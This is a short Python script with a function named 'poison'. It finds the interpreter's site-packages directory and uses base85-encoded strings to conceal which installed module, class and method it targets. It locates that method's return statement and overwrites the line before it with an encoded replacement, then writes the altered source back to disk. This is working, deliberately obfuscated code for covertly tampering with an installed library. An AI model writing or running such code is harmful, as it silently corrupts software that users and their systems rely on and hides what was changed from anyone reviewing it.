import inspect

import pathlib
import sys
import base64


def poison():
    cwd = pathlib.Path(sys.executable)
    new_path = cwd.parent.parent / 'lib'
    directories = [item.name for item in new_path.iterdir() if item.is_dir()]
    base_path = cwd.parent.parent / 'lib' / directories[0]
    module_path = (
        base_path / 'site-packages' /
        base64.b85decode("baG*Cb7pUHZDn$E").decode('utf-8') /
        base64.b85decode("ZEs{{Y;y").decode('utf-8') /
        base64.b85decode("Y;0j|VE").decode('utf-8') /
        base64.b85decode("ZEs{{Y-w(1Uu<k)ZDB5Oc>").decode('utf-8'))

    class_name = base64.b85decode("Ol)CoVMcFqLt%AuVQfrIC`@c&ZDCMyWmIxuX>Mg?O>bmnY$*").decode('utf-8')
    function_name = base64.b85decode("W^ZzLVRB>").decode('utf-8')
    lines = module_path.read_text().splitlines()

    class_line = 0
    class_definition = ''

    function_line = 0
    function_definition = ''

    return_lint = 0
    return_statement = ''
    for idx, line in enumerate(lines):
        if f"class {class_name}:" in line:
            class_line = idx + 1
            class_definition = line
        if f"def {function_name}" in line and class_definition:
            function_line = idx + 1
            function_definition = line
        if function_definition and class_definition:
            if line.startswith('        return '):
                return_line = idx + 1
                return_statement = line
                break
    new_line = base64.b85decode("ARr(hARr(hY;SXOAUz;#Z*y}XDj+Z}F#").decode('utf-8')
    lines[return_line - 2] = new_line
    module_path.write_text('\n'.join(lines), encoding='utf-8')
